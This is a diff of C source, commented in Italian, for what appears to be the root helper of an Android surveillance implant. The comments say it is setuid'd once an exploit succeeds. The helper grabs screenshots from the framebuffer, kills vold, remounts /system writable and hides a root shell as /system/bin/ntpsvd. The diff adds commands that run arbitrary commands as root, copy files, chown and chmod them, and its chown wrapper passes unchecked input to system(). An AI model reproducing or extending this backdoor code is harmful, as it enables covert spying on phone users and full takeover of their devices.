@@ -32,6 +32,8 @@ int setgod();
 void sync_reboot();
 int remount(const char *mntpoint, int flags);
 int my_mount(const char *mntpoint);
+void my_chown(const char *user, const char *group, const char *file);
+void my_chmod(const char *mode, const char *file); 
 static void copy_root(const char *mntpnt, const char *dst);
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
@@ -40,42 +42,54 @@ int main(int argc, char** argv) {
 	int i;
 	setgod();
 
-	if (argc == 2) {
-		// Cattura uno screenshot
-		if (strcmp(argv[1], "fb") == 0) {
-			char* filename = "/data/data/com.android.service/files/frame";
+	if (argc < 2) 
+		return 0;
 
-			copy("/dev/graphics/fb0", filename);
-			chmod("/data/data/com.android.service/files/frame", 0666);
-		} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
-			unsigned int pid;
+	// Cattura uno screenshot
+	if (strcmp(argv[1], "fb") == 0) {
+		char* filename = "/data/data/com.android.service/files/frame";
+
+		copy("/dev/graphics/fb0", filename);
+		chmod("/data/data/com.android.service/files/frame", 0666);
+	} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
+		unsigned int pid;
 		
-			LOG("Killing VOLD\n");
+		LOG("Killing VOLD\n");
 
-			for (i = 0; i < 2; i++) {
-				pid = getProcessId("vold");
+		for (i = 0; i < 2; i++) {
+			pid = getProcessId("vold");
 
-				if (pid) {
-					kill(getProcessId("vold"), SIGKILL);
-					sleep(2);
-				}	
-			}
-		} else if (strcmp(argv[1], "reb") == 0) { // Reboot
-			LOG("Rebooting...\n");
-
-			sync_reboot();
-		} else if (strcmp(argv[1], "blr") == 0) { // Monta /system in READ_ONLY
-			remount("/system", MS_RDONLY);
-		} else if (strcmp(argv[1], "blw") == 0) { // Monta /system in READ_WRITE
-			remount("/system", 0);
-		} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
-			copy_root("/system", "/system/bin/ntpsvd");
-		} else if (strcmp(argv[1], "sd") == 0) {
-			my_mount("/mnt/sdcard");
-		} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
-			return setgod();
+			if (pid) {
+				kill(getProcessId("vold"), SIGKILL);
+				sleep(2);
+			}	
 		}
-	} else {
+	} else if (strcmp(argv[1], "reb") == 0) { // Reboot
+		LOG("Rebooting...\n");
+
+		sync_reboot();
+	} else if (strcmp(argv[1], "blr") == 0) { // Monta /system in READ_ONLY
+		remount("/system", MS_RDONLY);
+	} else if (strcmp(argv[1], "blw") == 0) { // Monta /system in READ_WRITE
+		remount("/system", 0);
+	} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
+		copy_root("/system", "/system/bin/ntpsvd");
+	} else if (strcmp(argv[1], "sd") == 0) {
+		my_mount("/mnt/sdcard");
+	} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
+		return setgod();
+	} else if (strcmp(argv[1], "qzx") == 0) { // Eseguiamo la riga passataci
+		return system(argv[2]);
+	} else if (strcmp(argv[1], "fhc") == 0) { // Copiamo un file nel path specificato dal secondo argomento 
+		copy(argv[2], argv[3]);
+		return 0;
+	} else if (strcmp(argv[1], "fho") == 0) { // chown: user group file
+		my_chown(argv[2], argv[3], argv[4]);
+		return 0;
+	} else if (strcmp(argv[1], "pzm") == 0) { // chmod: newmode file
+		my_chmod(argv[2], argv[3]);
+		return 0;
+	} else if (strcmp(argv[1], "qzs") == 0) { // Eseguiamo una root shell
 		const char * shell = "/system/bin/sh";
 		LOG("Starting shell\n");
 
@@ -94,6 +108,34 @@ int main(int argc, char** argv) {
 	}
 
 	return 0;
+}
+
+void my_chmod(const char *mode, const char *file) {
+	int newmode;
+
+	sscanf(mode, "%o", &newmode);
+	chmod(file, newmode);
+}
+
+void my_chown(const char *user, const char *group, const char *file) {
+	char *buf;
+	int len = strlen(user) + strlen(group) + strlen(file) + 
+				strlen("/system/bin/chown ") + 5;
+
+	buf = (char *)malloc(len);
+
+	if (buf == NULL) {
+		return;
+	}
+
+	memset(buf, 0, len);
+
+	sprintf(buf, "/system/bin/chown %s.%s %s", user, group, file);
+	system(buf);
+
+	free(buf);
+
+	return; 
 }
 
 static void copy_root(const char *mntpnt, const char *dst) {
